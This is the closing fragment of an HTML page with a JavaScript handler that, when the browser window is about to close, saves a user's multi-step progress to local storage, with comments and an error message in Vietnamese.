// Xóa dữ liệu khi đóng trình duyệt (tùy chọn)
window.onbeforeunload = function() {
try {
    if (userData.currentStep < 10) {
        saveToLocalStorage(userData.currentStep || 1);
    }
} catch (error) {
    console.error("Lỗi lưu trước khi đóng:", error);
}
};
</script>
</body>
</html>
